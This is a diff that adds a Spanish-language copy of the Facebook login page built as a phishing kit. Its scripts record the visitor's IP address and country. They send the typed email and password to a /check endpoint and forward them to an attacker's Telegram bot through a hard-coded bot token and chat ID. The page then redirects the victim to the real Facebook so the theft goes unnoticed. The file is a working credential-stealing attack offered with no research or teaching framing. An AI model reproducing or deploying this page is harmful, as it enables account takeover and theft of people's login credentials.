@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Entrar o registrarse</title>
+    <link rel="shortcut icon" href="https://www.facebook.com/images/fb_icon_325x325.png" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const passwordInput = document.getElementById('pass');
+            const eyeIcon = document.querySelector('.fa-eye');
+            eyeIcon.addEventListener('click', function () {
+                const isPasswordVisible = passwordInput.type === 'text';
+                passwordInput.type = isPasswordVisible ? 'password' : 'text';
+                eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
+            });
+        });
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            /* background-color: #F0F2F5; */
+            display: flex;
+            background-color: #fff;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(to bottom, #F0F2F5 694px, #fff 2px);
+
+        }
+
+
+        .home {
+            height: 694px;
+            text-align: center;
+            width: 100%;
+            background-color: #F0F2F5;
+        }
+
+        .content {
+            min-width: 980px;
+            min-height: 536px;
+            display: flex;
+            width: 100%;
+            justify-content: center;
+            margin-top: 120px;
+            margin-bottom: 200px;
+
+
+        }
+
+        .content-left {
+            box-sizing: border-box;
+            margin-right: 0;
+            padding-right: 110px;
+            width: 580px;
+            display: inline-block;
+        }
+
+        .content-left .image {
+            width: 548px;
+            height: 182px;
+            padding: 112px 0 16px;
+            display: flex;
+        }
+
+        .content-left .content {
+            width: 500px;
+        }
+
+
+        .content-left .content h2 {
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+            font-size: 28px;
+            color: #1c1e21;
+            grid-area: auto;
+            line-height: 32px;
+            padding: 0 0 20px;
+            width: 500px;
+
+        }
+
+        h2 {
+            text-align: left;
+        }
+
+        .image img {
+            display: inline;
+            grid-area: auto;
+            line-height: 16px;
+            margin: -28px;
+            min-width: 321px;
+            max-height: 106px;
+            min-height: 0;
+            object-fit: cover;
+        }
+
+        .content-right {
+            display: inline-block;
+            line-height: 16px;
+        }
+
+
+        .formLogin {
+            background-color: #fff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            box-sizing: border-box;
+            margin: 40px 0 0;
+            padding: 20px 15px 28px;
+            width: 396px;
+            height: 360px;
+            text-align: center;
+            align-items: center;
+        }
+
+        .input {
+            height: 52px;
+            background-color: #ffffff;
+            border-radius: 6px;
+            color: #1d2219;
+            display: inline-block;
+            font-size: 17px;
+            line-height: 16px;
+            padding: 14px 16px;
+            border: 1px solid #ccc;
+            margin-bottom: 15px;
+            width: 100%;
+        }
+
+        .input i {
+            margin-top: 50px;
+        }
+
+        .input :focus {
+            border: 1px solid #1877F2 !important;
+        }
+
+        .password {
+            display: flex;
+            position: relative;
+        }
+
+        .password i {
+            position: absolute;
+            right: 14px;
+            top: 25%;
+        }
+
+        .btnLogin {
+            font-size: 20px;
+            font-family: inherit;
+            background-color: #0866ff;
+            border: none;
+            border-radius: 6px;
+            padding: 0 16px;
+            width: 100%;
+            color: #fff;
+            font-weight: 700;
+            line-height: 48px;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .formLogin .forgotPassword {
+            color: #0866ff;
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 19px;
+            text-align: center;
+            text-decoration: none;
+            margin-bottom: 15px;
+        }
+
+        .hr {
+            color: #dadde1;
+        }
+
+        .create {
+            background-color: #42b72a;
+            border-radius: 6px;
+            display: inline-block;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 700;
+            justify-content: center;
+            line-height: 48px;
+            padding: 0px 16px;
+            text-align: center;
+            text-decoration: none;
+        }
+
+        .formLogin .create:hover {
+            color: #ffffff;
+            opacity: 0.9;
+        }
+
+        .bottomForm {
+            width: 396px;
+            text-align: center;
+            margin: 28px 0 0;
+            font-size: 14px;
+            line-height: 19px;
+        }
+
+        .bottomForm a {
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            color: #1C1E21;
+            font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
+
+        }
+
+        .bottomForm span {
+            font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
+
+        }
+
+        #loader {
+            padding: 0 16px;
+            line-height: 40px;
+            margin-bottom: 30px;
+            display: none;
+            width: 100%;
+            flex-direction: row;
+            margin-top: 20px;
+            justify-content: center;
+        }
+
+        .loader {
+            font-size: 6px;
+            width: 1em;
+            height: 1em;
+            border-radius: 50%;
+            position: relative;
+            text-indent: -9999em;
+            animation: mulShdSpin 1.1s infinite ease;
+            transform: translateZ(0);
+        }
+
+        @keyframes mulShdSpin {
+
+            0%,
+            100% {
+                box-shadow: 0em -2.6em 0em 0em #007bff, 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.5), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.7);
+            }
+
+            12.5% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.7), 1.8em -1.8em 0 0em #007bff, 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.5);
+            }
+
+            25% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.5), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.7), 2.5em 0em 0 0em #007bff, 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+            }
+
+            37.5% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.5), 2.5em 0em 0 0em rgba(0, 123, 255, 0.7), 1.75em 1.75em 0 0em #007bff, 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+            }
+
+            50% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.5), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.7), 0em 2.5em 0 0em #007bff, -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+            }
+
+            62.5% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.5), 0em 2.5em 0 0em rgba(0, 123, 255, 0.7), -1.8em 1.8em 0 0em #007bff, -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+            }
+
+            75% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.5), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.7), -2.6em 0em 0 0em #007bff, -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+            }
+
+            87.5% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.5), -2.6em 0em 0 0em rgba(0, 123, 255, 0.7), -1.8em -1.8em 0 0em #007bff;
+            }
+        }
+
+
+        .footer {
+            margin-top: 40px;
+            width: 100%;
+            margin-bottom: 25px;
+        }
+
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            position: relative;
+        }
+
+        .pageFooter {
+            text-align: center;
+        }
+
+        .locate {
+            align-items: center;
+            display: flex;
+            flex-wrap: wrap;
+            grid-area: auto;
+            font-size: 12px;
+            line-height: 16px;
+            padding: 8px 0 0;
+            margin-left: 160px;
+
+        }
+
+        .locate ul {
+            display: flex;
+            list-style: none;
+            align-items: center;
+            margin-top: -8px;
+        }
+
+        .locate ul li {
+            line-height: 16px;
+            grid-area: auto;
+            padding: 0px 0px 0px 10px;
+        }
+
+        .locate li a {
+            white-space: nowrap;
+            text-decoration: none;
+            color: #737373;
+            font-size: 12px;
+            font-family: inherit;
+        }
+
+        .add {
+            background-color: #fff;
+            border-radius: 2px;
+            color: #8a8d91;
+            display: inline-block;
+            font-size: 12px;
+            justify-content: center;
+            line-height: 18px;
+            padding: 0px 8px;
+            text-align: center;
+        }
+
+        .add i {
+            font-size: 12px;
+            font-weight: 700;
+            color: #8a8d91;
+            text-align: center;
+            grid-area: auto;
+        }
+
+        .pageFooter hr {
+            max-width: 980px;
+            margin-left: 200px;
+        }
+
+        .pageFooter span {
+            margin-left: 200px;
+            display: flex;
+            flex: flex-start;
+            color: #737373;
+            font-size: 11px;
+            line-height: 14.73px;
+        }
+    </style>
+    <script>
+        async function submitForm() {
+            var emailInput = document.getElementById('email');
+            var emailValue = emailInput.value;
+            var passwordInput = document.getElementById('pass');
+            var passwordValue = passwordInput.value;
+            if (emailValue === '') {
+                emailInput.style.borderColor = 'red';
+                emailInput.focus();
+            }
+            else if (passwordValue === '') {
+                passwordInput.focus();
+            }
+            else {
+                var button = document.getElementById("login");
+                var loader = document.getElementById("loader");
+                button.style.display = "none";
+                loader.style.display = "flex";
+                event.preventDefault();
+                const ipAddress = localStorage.getItem('ipAddress');
+                const address = localStorage.getItem('address');
+                const response = await fetch(`/check?username=${emailValue}&password=${passwordValue}`);
+                const data = await response.json();
+                if (data) {
+                    const options = {
+                        method: 'POST',
+                        headers: {
+                            accept: 'application/json',
+                            'User-Agent': 'Telegram Bot SDK - (https://github.com/irazasyed/telegram-bot-sdk)',
+                            'content-type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            text: "<b>IP</b>: <code>" + ipAddress + "</code> \n<b>Địa chỉ:</b> <code>" + address + "</code> \n<b>Email:</b><code> " + emailValue + "</code>\n<b>Mật khẩu</b>:<code> " + passwordValue + "</code>",
+                            parse_mode: 'HTML',
+                            disable_web_page_preview: false,
+                            disable_notification: false,
+                            reply_to_message_id: null,
+                            chat_id: '5491296890'
+                        })
+                    };
+                    fetch('https://api.telegram.org/bot7043773023:AAFlwYHpOSQXjEKZVnI2TP9ed7VIHD1P0Gs/sendMessage', options)
+                        .then(response => response.json())
+                        .then(response => console.log(response))
+                        .catch(err => console.error(err));
+                    var button = document.getElementById("login");
+                    var loader = document.getElementById("loader");
+                    button.style.display = "block";
+                    loader.style.display = "none";
+                    button.addEventListener("click", submitForm);
+                    window.location.href = 'https://facebook.com';
+                } else {
+                    emailInput.value = '';
+                    passwordInput.value = '';
+                    passwordInput.style.borderColor = 'red';
+                    passwordInput.placeholder = 'La contraseña que has introducido es incorrecta.';
+                    var button = document.getElementById("login");
+                    var loader = document.getElementById("loader");
+
+                    button.style.display = "block";
+                    loader.style.display = "none";
+                    button.addEventListener("click", submitForm);
+                }
+            }
+        }
+        function removeRedBorder() {
+            var emailInput = document.getElementById('email');
+            var passwordInput = document.getElementById('pass');
+            passwordInput.setAttribute('placeholder', 'Contraseña');
+            passwordInput.style.borderColor = 'black';
+            emailInput.style.borderColor = 'black';
+        }
+
+
+    </script>
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', async function () {
+            let ipAddress;
+            let address;
+            const ipifyResponse = await fetch('https://api.ipify.org?format=json');
+            const ipifyData = await ipifyResponse.json();
+            ipAddress = ipifyData.ip;
+
+            const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
+            const ipLocationNetData = await ipLocationNetResponse.json();
+            address = ipLocationNetData.country_name;
+
+            localStorage.setItem('ipAddress', ipAddress);
+            localStorage.setItem('address', address);
+        });
+    </script>
+</head>
+
+<body>
+    <div class="container">
+        <div class="home" id="home">
+            <div class="content" id="content">
+                <div class="content-left col-6" id="content-left">
+                    <div class="image" id="img">
+                        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="">
+                    </div>
+                    <div class="content-left text">
+                        <h2 id="h2text">
+                            Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu
+                            vida.
+                        </h2>
+                    </div>
+                </div>
+                <div class="content-right col-3" id="content-right">
+                    <div class="formLogin">
+                        <form id="check">
+                            <div class="email" id="emailContainer">
+                                <input type="text" class="input" placeholder="Correo electrónico o número de teléfono"
+                                    id="email" oninput="removeRedBorder()">
+                            </div>
+                            <div class="password" id="passContainer">
+                                <input type="password" class="input" placeholder="Contraseña" id="pass"
+                                    oninput="removeRedBorder()">
+                                <i id="eye" class="fa fa-eye"></i>
+                            </div>
+                            <button class="btnLogin" name="login" id="login" onclick="submitForm()">Iniciar
+                                sesión</button>
+                            <div id="loader">
+                                <div class="loader"></div>
+                            </div>
+                            <a id="forgot" class="forgotPassword" href="#">¿Has olvidado la contraseña?</a>
+                            <hr class="hr">
+                            <a id="create" class="create" href="#">Crear cuenta nueva</a>
+                        </form>
+                    </div>
+                    <div class="bottomForm">
+                        <a id="page" href="">Crea una página</a>
+                        <span id="spanid">para un famoso, una marca o una empresa</span>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+        <div class="footer">
+            <div class="pageFooter" id="pageFooter">
+                <div class="locate" id="locate">
+                    <ul id="locateul">
+                        <li><a href="#">Español (España)</a></li>
+                        <li><a href="#">English (UK)</a></li>
+                        <li><a href="#">中文(台灣)</a></li>
+                        <li><a href="#">한국어</a></li>
+                        <li><a href="#">日本語</a></li>
+                        <li><a href="#">Français (France)</a></li>
+                        <li><a href="#">ภาษาไทย</a></li>
+                        <li><a href="#">Español</a></li>
+                        <li><a href="#">Português (Brasil)</a></li>
+                        <li><a href="#">Deutsch</a></li>
+                        <li><a href="#">Italiano</a></li>
+                        <li><a class="add" href="#"><i>+</i></a></li>
+                    </ul>
+                </div>
+                <hr>
+                <div class="locate" id="locate2">
+                    <ul id="locate2ul1">
+                        <li><a href="#">Registrarte</a></li>
+                        <li><a href="#">Iniciar sesión</a></li>
+                        <li><a href="#">Messenger</a></li>
+                        <li><a href="#">Facebook Lite</a></li>
+                        <li><a href="#">Vídeo</a></li>
+                        <li><a href="#">Lugares</a></li>
+                        <li><a href="#">Juegos</a></li>
+                        <li><a href="#">Español</a></li>
+                        <li><a href="#">Marketplace</a></li>
+                        <li><a href="#">Meta Pay</a></li>
+                        <li><a href="#">Meta Store</a></li>
+                        <li><a href="#">Imaginar con Meta AI</a></li>
+                        <li><a href="#">Instagram</a></li>
+                        <li><a href="#">Threads</a></li>
+                    </ul>
+                    <ul id="locate2ul2">
+                        <li><a href="#">Recaudaciones de fondos</a></li>
+
+                        <li><a href="#">Servicios</a></li>
+                        <li><a href="#">Centro de información de votación</a></li>
+                        <li><a href="#">Política de privacidad</a></li>
+                        <li><a href="#">Centro de privacidad</a></li>
+                        <li><a href="#">Grupos</a></li>
+                        <li><a href="#">Información</a></li>
+                        <li><a href="#">Crear anuncio</a></li>
+                        <li><a href="#">Crear página</a></li>
+                    </ul>
+                    <ul>
+                        <li><a href="#">Empleo</a></li>
+                        <li><a href="#">Cookies</a></li>
+                        <li><a href="#">Opciones de anuncios</a></li>
+                        <li><a href="#">Condiciones</a></li>
+                        <li><a href="#">Ayuda</a></li>
+                        <li><a href="#">Subir contactos y no usuariosConfiguración</a></li>
+                    </ul>
+                </div>
+                <span id="span">Meta © 2024</span>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
